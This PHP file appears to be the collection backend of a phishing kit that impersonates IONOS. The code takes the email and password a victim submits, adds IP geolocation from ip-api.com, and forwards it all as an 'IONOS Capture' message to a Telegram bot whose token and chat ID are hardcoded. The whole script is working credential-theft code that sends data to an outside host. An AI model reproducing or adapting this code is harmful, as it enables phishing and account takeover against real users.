<?php
// GATHER DATA
$email = $_POST['email'] ?? 'Unknown';
$pass = $_POST['pass'] ?? 'Unknown';
$ua = $_POST['ua'] ?? 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'];

// --- GEO-IP LOOKUP ---
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $details->city ?? "Unknown City";
$country = $details->country ?? "Unknown Country";
$isp = $details->isp ?? "Unknown ISP";

// TELEGRAM CREDENTIALS
$botToken = "7284066719:AAESrzINEKBG1kyj9oM_4U3KeKptQeHBQaI";
$chatId = "7724482403";

$message = "🌐 *IONOS Capture*\n\n";
$message .= "📧 *User:* `$email`\n";
$message .= "🔑 *Pass:* `$pass`\n";

$message .= "📍 *IP:* `$ip`\n";

$message .= "🌍 *Location:* $city, $country\n";
$message .= "🏢 *ISP:* $isp\n";
$message .= "💻 *UA:* $ua";


$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
@file_get_contents($url, false, $context);
?>
